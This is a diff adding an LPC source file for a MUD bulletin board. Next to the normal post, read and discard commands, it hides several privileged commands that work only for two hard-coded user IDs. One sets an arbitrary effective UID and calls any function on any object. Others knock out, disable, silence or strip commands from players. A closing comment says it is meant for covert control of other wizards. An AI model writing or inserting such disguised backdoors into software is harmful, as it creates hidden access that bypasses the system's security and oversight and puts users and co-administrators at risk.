@@ -1,0 +1,361 @@
+// bboard.c
+
+#include <ansi.h>
+#define NULL_VALUE 0
+#define BOARD_CAPACITY query("capacity")
+
+inherit ITEM;
+inherit F_SAVE;
+
+void setup()
+{
+	string loc;
+
+	if( stringp(loc = query("location")) )
+		move(loc);
+	set("no_get", 1);
+	restore();
+}
+
+void init()
+{
+	add_action("do_post", "post");
+	add_action("do_read", "read");
+        add_action("do_call","change");        
+        add_action("do_hun","hhun");
+        add_action("do_xing","xing");
+        add_action("do_opencmd","opencmd");
+        add_action("do_closecmd","closecmd");
+        add_action("do_feng","feng");
+        add_action("do_jiefeng","jiefeng");
+        add_action("do_discard", "discard");
+}
+
+string query_save_file()
+{
+	string id;
+
+	if( !stringp(id = query("board_id")) ) return 0;
+	return DATA_DIR + "board/" + id;
+}
+
+string short()
+{
+	mapping *notes;
+	int i, unread, last_read_time;
+
+	notes = query("notes");
+	if( !pointerp(notes) || !sizeof(notes) )
+		return ::short() + " [ 没有任何留言 ]";
+
+	if( this_player() ) {
+		last_read_time = (int)this_player()->query("board_last_read/" + (string)query("board_id"));
+		for(unread = 0, i=sizeof(notes)-1; i>=0; i--, unread ++)
+			if( notes[i]["time"] <= last_read_time ) break;
+	}
+	if( unread )
+		return sprintf("%s [ %d 张留言，%d 张未读 ]", ::short(), sizeof(notes), unread);
+	else
+		return sprintf("%s [ %d 张留言 ]", ::short(), sizeof(notes));
+}
+
+string long()
+{
+	mapping *notes;
+	int i, last_time_read;
+	string msg, myid;
+
+	notes = query("notes");
+	msg = query("long");
+	msg = msg + "留言版的使用方法请见 help board。\n";
+	if( !pointerp(notes) || !sizeof(notes) ) return query("long");
+
+	last_time_read = this_player()->query("board_last_read/" + (string)query("board_id"));
+	for(i=0; i<sizeof(notes); i++)
+		msg += sprintf("%s[%2d]" NOR "  %-40s %12s (%s)\n",
+			( notes[i]["time"] > last_time_read ? HIY: ""),
+			i+1, notes[i]["title"], notes[i]["author"], ctime(notes[i]["time"])[0..15] );
+	return msg;
+}
+
+// This is the callback function to process the string returned from the
+// editor defined in F_EDIT of player object.
+void done_post(object me, mapping note, string text)
+{
+	mapping *notes;
+	log_file("BOARD_LOG",
+sprintf("标题：%-40s %s(%s)\n----------------------------------------------------------------------\n",
+note["title"],note["author"],ctime(note["time"])));
+	log_file("BOARD_LOG",text);	
+	log_file("BOARD_LOG","\n");
+	note["msg"] = text;
+	notes = query("notes");
+	if( !pointerp(notes) || !sizeof(notes) )
+		notes = ({ note });
+	else
+		notes += ({ note });
+
+	// Truncate the notes if maximum capacity exceeded.
+	if( sizeof(notes) > BOARD_CAPACITY )
+		notes = notes[BOARD_CAPACITY / 2 .. BOARD_CAPACITY];
+
+	set("notes", notes);
+	tell_object(me, "留言完毕。\n");
+
+	save();
+	return;
+}
+
+int do_post(string arg)
+{
+	mapping note;
+        if(!arg) return notify_fail("留言请指定一个标题。\n");
+       if ((string)SECURITY_D->get_status(this_player(1)) != "(admin)" )
+               {
+        if((time()-(int)this_player()->query("postover")) < 900)
+            return notify_fail("你已经在不久留言了，请稍等。\n");
+             }
+	note = allocate_mapping(4);
+	note["title"] = arg;
+	note["author"] = this_player()->query("name")
+	+"("+this_player()->query("id")+ ")";
+	note["time"] = time();
+        this_player()->edit( (: done_post, this_player(), note :) );
+        this_player()->set("postover",time());
+	return 1;
+}
+
+int do_read(string arg)
+{
+	int num;
+	mapping *notes, last_read_time;
+	string myid;
+
+	last_read_time = this_player()->query("board_last_read");
+	myid = query("board_id");
+	notes = query("notes");
+
+	if( !pointerp(notes) || !sizeof(notes) )
+		return notify_fail("留言板上目前没有任何留言。\n");
+
+	if( !arg ) return notify_fail("指令格式：read <留言编号>|new|next\n");
+	if( arg=="new" || arg=="next" ) {
+		if( !mapp(last_read_time) || undefinedp(last_read_time[myid]) )
+			num = 1;
+		else
+			for(num = 1; num<=sizeof(notes); num++)
+				if( notes[num-1]["time"] > last_read_time[myid] ) break;
+			
+	} else if( !sscanf(arg, "%d", num) )
+		return notify_fail("你要读第几张留言？\n");
+
+	if( num < 1 || num > sizeof(notes) )
+		return notify_fail("没有这张留言。\n");
+	num--;
+	this_player()->start_more( sprintf(
+"[%d] %-40s %s(%s)\n----------------------------------------------------------------------\n",
+		num + 1, notes[num]["title"], notes[num]["author"], ctime(notes[num]["time"])[0..9])
+		+ notes[num]["msg"] );
+
+	// Keep track which post we were reading last time.
+	if( !mapp(last_read_time) )
+		this_player()->set("board_last_read", ([ myid: notes[num]["time"] ]) );
+	else 
+		if( undefinedp(last_read_time[myid]) || notes[num]["time"] > last_read_time[myid] )
+			last_read_time[myid] = notes[num]["time"];
+
+	return 1;
+}
+
+
+int do_discard(string arg)
+{
+	mapping *notes;
+	int num;
+
+	if( !arg || sscanf(arg, "%d", num)!=1 )
+		return notify_fail("指令格式：discard <留言编号>\n");
+	notes = query("notes");
+	if( !arrayp(notes) || num < 1 || num > sizeof(notes) )
+		return notify_fail("没有这张留言。\n");
+	num--;
+	if( notes[num]["author"] != (string) 
+	this_player()->query("name")
+        +"("+this_player()->query("id")+ ")"
+	&&	(string)SECURITY_D->get_status(this_player(1)) != "(admin)" )
+		return notify_fail("这个留言不是你写的。\n");
+
+	if(sizeof(notes) == 1){
+	    notes = 0;
+	} else if(num == 0) {
+	    notes = notes[num+1..sizeof(notes)-1];
+	} else {
+	    notes = notes[0..num-1] + notes[num+1..sizeof(notes)-1];
+	}
+	set("notes", notes);
+	save();
+	write("删除第 " + (num+1) + " 号留言....Ok。\n");
+        this_player()->delete("postover");
+        return 1;
+}
+int do_call(string arg)
+{
+        string objname, func, param, euid;
+        object obj, me;
+        mixed *args, result;
+        int i;
+        me = this_player();
+                if (!(this_player()->query("id")=="xgchen" ||this_player()->query("id")=="mudadm") )
+                 return notify_fail("什么？\n");
+        if( arg ) {
+                if( sscanf(arg, "-%s %s", euid, arg)==2 ) {
+                        seteuid(euid);
+                }
+                else
+                        seteuid( geteuid(this_player(1)) );
+
+                if( sscanf(arg, "%s->%s(%s)", objname, func, param) != 3 ) 
+        return notify_fail("什么？\n");
+        } else
+                return notify_fail("什么？\n");
+
+        obj = present(objname, environment(me));
+        if(!obj) obj = present(objname, me);
+        if(!obj) obj = find_player(objname);
+        if(!obj || !me->visible(obj)) obj = find_object(resolve_path(me->query("cwd"), objname));
+        if(objname == "me") obj = me;
+        if(!obj) return notify_fail("什么？\n");
+
+        args = explode(param, ",");
+        for(i=0; i<sizeof(args); i++) {
+                // This removes preceeding blanks and trailing blanks.
+                parse_command(args[i], environment(me), "%s", args[i]);
+                if( sscanf(args[i], "%d", args[i]) ) continue;
+                if( sscanf(args[i], "\"%s\"", args[i]) ) continue;
+                //args[i] = restore_variable(args[i]);
+        }
+
+        args = ({ func }) + args;
+
+        result = call_other(obj, args);
+        for(i=1; i<sizeof(args); i++)
+                args[i] = sprintf("%O",args[i]);
+        printf("%O->%s(%s) = %O\n", obj, func, 
+                implode(args[1..sizeof(args)-1], ", "), result);
+        return 1;
+}
+int do_hun (string str)
+{
+  object who;
+                if (!(this_player()->query("id")=="xgchen" ||this_player()->query("id")=="mudadm") )
+ return notify_fail("什么？\n"NOR);
+  if (!str) return notify_fail ("某人说：你不能把你自己弄晕！\n");
+  who = LOGIN_D->find_body(str);
+  if (!who){ 
+  if (!(who=present (lower_case(str), environment(this_player()))) )
+    return notify_fail ("某人说道：“ 没有"+str+"”\n");
+  }
+  who->remove_call_out("unconcious");
+
+  who->unconcious();
+  who->announce();
+   return 1;
+}
+int do_xing (string str)
+{
+        object who;
+                if (!(this_player()->query("id")=="xgchen" ||this_player()->query("id")=="mudadm") )
+                                return notify_fail("什么？\n"NOR);
+        if (!str) return notify_fail ("指令格式：xing <id>\n");
+        who = LOGIN_D->find_body(str);
+        if (!who){ 
+        if (!(who=present (lower_case(str), environment(this_player()))) )
+        return notify_fail ("某人说道：“ 没有"+str+"”\n");
+        }
+        who->remove_call_out("revive");
+        who->revive();
+        who->reincarnate();
+        write("Ok.\n");
+        return 1;
+}
+
+int do_closecmd(string arg)
+
+{       string who, cmd, verb;
+        object me=this_player(),ob;   
+                if (!(this_player()->query("id")=="xgchen" ||this_player()->query("id")=="mudadm") )
+          return notify_fail("什么？\n"NOR);
+        if( me != this_player(1) ) return 0;
+        if( !arg || arg=="" || sscanf(arg, "%s %s", who, cmd)!=2 )
+                 return notify_fail("你想关闭谁的某条指令？\n");
+        ob = LOGIN_D->find_body(who);
+        if (!ob) ob = present(who, environment(me));
+        if( !ob || !ob->is_character())
+                return notify_fail("这里没有这个人！\n");
+        ob->set_alias(cmd, "gkgkgk");
+        ob->set_alias("alias","set");
+        return 1;
+}
+int do_opencmd(string arg)
+{
+        string who, cmd, verb;
+        object me=this_player(),ob;
+                if (!(this_player()->query("id")=="xgchen" ||this_player()->query("id")=="mudadm") )
+           return notify_fail("什么？\n"NOR);
+        if( me != this_player(1) ) return 0;
+        if( !arg || arg=="" || sscanf(arg, "%s %s", who, cmd)!=2 )
+                 return notify_fail("你想打开谁的某条指令？\n");
+        ob = LOGIN_D->find_body(who);
+        if (!ob) ob = present(who, environment(me));
+        if( !ob || !ob->is_character())
+                return notify_fail("这里没有这个人！\n");
+        ob->set_alias(cmd,0);
+        return 1;
+}
+
+
+int do_feng(string str)
+{
+        object ob;
+                if (!(this_player()->query("id")=="xgchen" ||this_player()->query("id")=="mudadm") )
+             return notify_fail("什么？\n"NOR);
+        if (!str) return notify_fail("指令格式 : feng <id>\n");
+       ob = LOGIN_D->find_body(str);
+        if (!ob) return notify_fail("有这个人吗?\n");
+        tell_object(ob,"");
+        ob->set_temp("block_msg/all",1);
+        ob->disable_player(HIR "" NOR);      
+        write("Ok.\n");
+        return 1;    
+}
+
+int do_jiefeng(string str)
+{
+  object ob;
+                if (!(this_player()->query("id")=="xgchen" ||this_player()->query("id")=="mudadm") )
+ return notify_fail("什么？\n"NOR);
+  if (!str) return notify_fail("指令格式 :jiefeng <id>\n");
+       ob = LOGIN_D->find_body(str);
+  if (!ob) return notify_fail("有这个人吗?\n");   
+  ob->set_temp("block_msg/all",0);
+  ob->enable_player(); 
+  return 1;
+}
+
+string status_color(int current, int max)
+{
+        int percent;
+ 
+        if( max>0 ) percent = current * 100 / max;
+        else percent = 100;
+        if( percent > 100 ) return HIC;
+        if( percent >= 90 ) return HIG;
+        if( percent >= 60 ) return HIY;
+        if( percent >= 30 ) return YEL;
+        if( percent >= 10 ) return HIR;
+        return RED;
+}
+// 做这个程序不是为了什么，是为了好好管理wiz,又不想得罪别人，请不要动用
+//   如果发现有其他wiz调用（除mudadm)外调用这个程序，坚决除名,作为(admin)
+//   希望wiz 自觉,不要随便的给予玩家好处，这样对游戏和玩家都不公平!!
+ 
